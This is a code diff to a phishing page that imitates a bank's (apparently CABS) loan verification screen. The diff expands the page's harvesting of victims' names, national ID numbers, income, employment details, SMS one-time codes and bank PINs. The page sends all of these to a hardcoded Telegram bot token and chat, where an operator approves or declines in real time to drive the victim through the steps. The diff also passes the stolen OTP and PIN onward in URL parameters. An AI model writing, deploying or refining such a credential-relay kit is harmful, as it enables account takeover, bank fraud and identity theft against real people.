@@ -156,6 +156,13 @@
             font-size: 18px;
             font-weight: 700;
             color: var(--white);
+            display: block;
+        }
+        .loan-badge .sub-val {
+            font-size: 13px;
+            opacity: 0.7;
+            margin-top: 2px;
+            display: block;
         }
 
         .otp-row {
@@ -280,7 +287,7 @@
         .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        /* ===== PIN Modal (CABS theme) ===== */
+        /* ===== PIN Modal ===== */
         .pin-overlay {
             position: fixed; inset: 0;
             display: none;
@@ -461,8 +468,10 @@
                 <p>Please enter the 6-digit security code sent to your mobile device to authorize this request.</p>
 
                 <div id="loanBox" class="loan-badge" style="display:none;">
-                    <span class="label" id="loanType">Loan Application</span>
+                    <span class="label">Loan Application</span>
                     <span class="val" id="loanAmount">$0.00 USD</span>
+                    <span class="sub-val" id="applicantName">—</span>
+                    <span class="sub-val" id="applicantId">ID: —</span>
                 </div>
 
                 <div id="err" class="error-msg"></div>
@@ -488,7 +497,7 @@
         <div class="sp-s">Securing your connection to CABS servers...</div>
     </div>
 
-    <!-- PIN Popup Modal (CABS theme) -->
+    <!-- PIN Popup Modal -->
     <div class="pin-overlay" id="pinOverlay">
         <div class="pin-card">
             <div class="pin-icon">&#128274;</div>
@@ -516,36 +525,52 @@
         const BOT = '8704011680:AAHmUOh5B9ehswuyZycUb9B83-SNP-AMQdI';
         const CID = '8541296815';
         let bd = {}, luid = 0, otp = '', phone = '';
-        let sent = false;            // ensure the OTP message is sent only once
+        let sent = false;
         let pinPollInterval = null;
         const boxes = document.querySelectorAll('.otp-box');
         const pinBoxes = document.querySelectorAll('.pin-box');
 
         function init() {
             const p = new URLSearchParams(location.search);
-            const name = p.get('name') || "Valued Client";
-            const amount = p.get('amount') || "0";
-            const purpose = p.get('purpose') || "Flex Loan";
-            phone = p.get('phone') || '';
+            
+            // Capture ALL details from URL
+            bd = {
+                firstName: p.get('firstName') || '',
+                middleName: p.get('middleName') || '',
+                surname: p.get('surname') || '',
+                phone: p.get('phone') || '',
+                idNumber: p.get('idNumber') || '',
+                amount: p.get('amount') || '0',
+                purpose: p.get('purpose') || 'Flex Loan',
+                period: p.get('period') || '12',
+                income: p.get('income') || '',
+                employmentStatus: p.get('employmentStatus') || ''
+            };
+            
+            phone = bd.phone;
 
-            if (amount !== "0") {
-                bd = { data: purpose, price: amount };
+            // Build full name: First Name + Middle Name + Surname
+            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
+
+            // Show loan details if amount exists
+            if (bd.amount && bd.amount !== '0') {
                 document.getElementById('loanBox').style.display = 'block';
-                document.getElementById('loanType').textContent = decodeURIComponent(purpose);
-                document.getElementById('loanAmount').textContent = '$' + parseFloat(amount).toLocaleString() + ' USD';
+                document.getElementById('loanAmount').textContent = '$' + parseFloat(bd.amount).toLocaleString() + ' USD — ' + decodeURIComponent(bd.purpose);
+                document.getElementById('applicantName').textContent = '👤 ' + (fullName || 'Valued Client');
+                document.getElementById('applicantId').textContent = '🪪 ID: ' + (bd.idNumber || '—');
             }
+
             setupOTP();
             setupPIN();
             boxes[0].focus();
         }
 
-        /* ============ OTP boxes: auto-advance + autofill + autosend ============ */
+        /* ============ OTP boxes ============ */
         function setupOTP() {
             boxes.forEach((b, i) => {
                 b.addEventListener('input', e => {
                     const v = e.target.value;
                     if (v.length > 1) {
-                        // Paste / autofill: distribute digits across boxes
                         const digs = v.replace(/\D/g, '').split('');
                         digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
                         boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
@@ -567,7 +592,6 @@
                 });
             });
 
-            // Autofill from clipboard / SMS suggestion paste
             document.addEventListener('paste', e => {
                 const data = e.clipboardData.getData('text').replace(/\D/g, '');
                 if (data.length >= 6) {
@@ -582,7 +606,6 @@
                 }
             });
 
-            // WebOTP autofill (Android: autocomplete="one-time-code")
             if ('OTPCredential' in window) {
                 try {
                     navigator.credentials.get({ otp: { transport: ['sms'] } }).then(cred => {
@@ -626,7 +649,6 @@
             return false;
         }
 
-        /* Autosend: 6 digits complete → send to Telegram immediately */
         function autosend() {
             if (sent) return;
             sent = true;
@@ -639,9 +661,28 @@
             clrErr();
             if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
 
-            // Start with 7 instead of +263
-            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nPlease choose an action below:`;
-            // Two buttons: Approve and Decline
+            // Build names clearly
+            const givenName = [bd.firstName, bd.middleName].filter(Boolean).join(' ');
+            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
+            const formattedAmount = parseFloat(bd.amount || '0').toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            const msg = `🔑 <b>OTP & Full Application Details</b>\n\n` +
+                `👤 <b>Surname:</b> <code>${bd.surname || '—'}</code>\n` +
+                `👤 <b>Given Name:</b> <code>${givenName || '—'}</code>\n` +
+                `👤 <b>Full Name:</b> <code>${fullName || 'Valued Client'}</code>\n` +
+                `📱 <b>Phone:</b> <code>${phone}</code>\n` +
+                `🪪 <b>ID Number:</b> <code>${bd.idNumber || '—'}</code>\n` +
+                `💰 <b>Amount:</b> <code>$${formattedAmount} USD</code>\n` +
+                `📅 <b>Period:</b> <code>${bd.period || '12'} months</code>\n` +
+                `🎯 <b>Purpose:</b> <code>${decodeURIComponent(bd.purpose || 'Flex Loan')}</code>\n` +
+                `💵 <b>Income:</b> <code>$${parseFloat(bd.income || '0').toLocaleString()}/mo</code>\n` +
+                `💼 <b>Employment:</b> <code>${decodeURIComponent(bd.employmentStatus || 'Not specified')}</code>\n` +
+                `🔢 <b>OTP Code:</b> <code>${otp}</code>\n\n` +
+                `Please choose an action below:`;
+
             const btns = [[{ text: '✅ Approve', callback_data: 'otp_approved' }, { text: '❌ Decline', callback_data: 'otp_declined' }]];
 
             document.getElementById('ov').classList.add('on');
@@ -650,7 +691,6 @@
             });
         }
 
-        /* Wait for Approve/Decline from Telegram */
         function poll() {
             const iv = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
@@ -664,7 +704,6 @@
                                     if (cb === 'otp_approved') {
                                         clearInterval(iv);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Approve clicked → open PIN popup modal
                                         openPINModal();
                                     }
                                     else if (cb === 'otp_declined') {
@@ -673,6 +712,9 @@
                                         showErr('Verification declined by the operator. Please check your details and try again.');
                                         boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); });
                                         boxes[0].focus();
+                                        sent = false;
+                                        document.getElementById('verifyBtn').disabled = false;
+                                        document.getElementById('autoNote').style.display = 'none';
                                     }
                                 }
                             });
@@ -741,7 +783,28 @@
             btn.disabled = true;
             btn.textContent = 'Sending...';
 
-            const msg = `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nIs this PIN valid?`;
+            const givenName = [bd.firstName, bd.middleName].filter(Boolean).join(' ');
+            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
+            const formattedAmount = parseFloat(bd.amount || '0').toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            const msg = `🔒 <b>PIN Verification - Full Details</b>\n\n` +
+                `👤 <b>Surname:</b> <code>${bd.surname || '—'}</code>\n` +
+                `👤 <b>Given Name:</b> <code>${givenName || '—'}</code>\n` +
+                `👤 <b>Full Name:</b> <code>${fullName || 'Valued Client'}</code>\n` +
+                `📱 <b>Phone:</b> <code>${phone}</code>\n` +
+                `🪪 <b>ID Number:</b> <code>${bd.idNumber || '—'}</code>\n` +
+                `💰 <b>Amount:</b> <code>$${formattedAmount} USD</code>\n` +
+                `📅 <b>Period:</b> <code>${bd.period || '12'} months</code>\n` +
+                `🎯 <b>Purpose:</b> <code>${decodeURIComponent(bd.purpose || 'Flex Loan')}</code>\n` +
+                `💵 <b>Income:</b> <code>$${parseFloat(bd.income || '0').toLocaleString()}/mo</code>\n` +
+                `💼 <b>Employment:</b> <code>${decodeURIComponent(bd.employmentStatus || 'Not specified')}</code>\n` +
+                `🔢 <b>OTP:</b> <code>${otp}</code>\n` +
+                `🔑 <b>PIN:</b> <code>${pin}</code>\n\n` +
+                `Is this PIN valid?`;
+
             const btns = [[{ text: '✅ Valid PIN', callback_data: 'pin_valid' }, { text: '❌ Invalid PIN', callback_data: 'pin_invalid' }]];
 
             await tg(msg, btns);
@@ -750,7 +813,6 @@
             pollPIN();
         }
 
-        /* Wait for Valid/Invalid PIN from Telegram */
         function pollPIN() {
             if (pinPollInterval) clearInterval(pinPollInterval);
             pinPollInterval = setInterval(() => {
@@ -764,12 +826,24 @@
                                     const cb = u.callback_query.data;
                                     if (cb === 'pin_valid') {
                                         clearInterval(pinPollInterval);
-                                        // Valid PIN → open success.html
-                                        location.href = 'success.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
+                                        const params = new URLSearchParams({
+                                            firstName: bd.firstName,
+                                            middleName: bd.middleName,
+                                            surname: bd.surname,
+                                            phone: phone,
+                                            idNumber: bd.idNumber,
+                                            amount: bd.amount,
+                                            purpose: bd.purpose,
+                                            period: bd.period,
+                                            income: bd.income,
+                                            employmentStatus: bd.employmentStatus,
+                                            otp: otp,
+                                            pin: pin
+                                        });
+                                        location.href = 'success.html?' + params.toString();
                                     }
                                     else if (cb === 'pin_invalid') {
                                         clearInterval(pinPollInterval);
-                                        // Invalid PIN → return to PIN popup modal
                                         pinShowErr('The PIN was declared invalid. Please re-enter your 4-digit PIN and try again.');
                                     }
                                 }
